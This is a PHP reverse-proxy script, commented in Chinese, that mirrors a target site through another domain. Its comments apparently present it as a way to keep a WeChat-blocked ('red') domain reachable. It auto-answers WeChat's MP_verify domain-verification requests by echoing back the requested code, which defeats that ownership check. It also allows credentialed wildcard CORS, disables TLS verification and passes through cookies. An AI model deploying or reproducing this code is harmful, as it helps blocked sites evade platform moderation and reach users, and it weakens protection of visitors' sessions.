<?php
// 【注意：双引号里面改成真实红域名】
$target_url = "https://www.baidu.com"; 

$request_uri = $_SERVER['REQUEST_URI'];

// ==========================================
// 【本次核心新增：微信业务域名/JS安全域名全自动验证】
// 智能拦截微信的验证请求，自动提取并返回验证码，免传txt文件
if (preg_match('/^\/MP_verify_(.*?)\.txt$/', $request_uri, $matches)) {
    header('Content-Type: text/plain');
    echo $matches[1];
    exit;
}
// ==========================================

// 核心修复：添加全面的跨域头，防止前端系统的 AJAX API 接口自己拦截自己
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: *");
header("Access-Control-Allow-Credentials: true");

// 核心修复：如果是前端系统的 OPTIONS 预检请求，直接返回成功，不向源站转发
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

if (!function_exists('getallheaders')) {
    function getallheaders() {
        $headers = [];
        foreach ($_SERVER as $name => $value) {
            if (substr($name, 0, 5) == 'HTTP_') {
                $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;
            } else if ($name == "CONTENT_TYPE") {
                $headers["Content-Type"] = $value;
            } else if ($name == "CONTENT_LENGTH") {
                $headers["Content-Length"] = $value;
            }
        }
        return $headers;
    }
}

$fetch_url = rtrim($target_url, '/') . $request_uri;

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $fetch_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_ENCODING, ""); // 自动解压 Gzip

$method = $_SERVER['REQUEST_METHOD'];
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);

if ($method === 'POST' || $method === 'PUT') {
    $post_data = file_get_contents('php://input');
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
}

$headers = [];
$target_host = parse_url($target_url, PHP_URL_HOST);
foreach (getallheaders() as $name => $value) {
    $name_lower = strtolower($name);
    if ($name_lower === 'host') {
        $headers[] = "Host: " . $target_host;
    } elseif ($name_lower === 'referer' || $name_lower === 'origin') {
        $headers[] = "$name: $target_url"; 
    } elseif ($name_lower === 'accept-encoding') {
        continue;
    } elseif ($name_lower !== 'content-length' && $name_lower !== 'host') { 
        $headers[] = "$name: $value";
    }
}
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, true);

$response = curl_exec($ch);
$header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
$header_str = substr($response, 0, $header_size);
$body = substr($response, $header_size);
curl_close($ch);

$header_lines = explode("\r\n", $header_str);
foreach ($header_lines as $line) {
    if (stripos($line, 'Set-Cookie:') === 0 || stripos($line, 'Content-Type:') === 0) {
        header($line, false);
    }
}

$current_domain = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
$body = str_replace($target_url, $current_domain, $body);

echo $body;
?>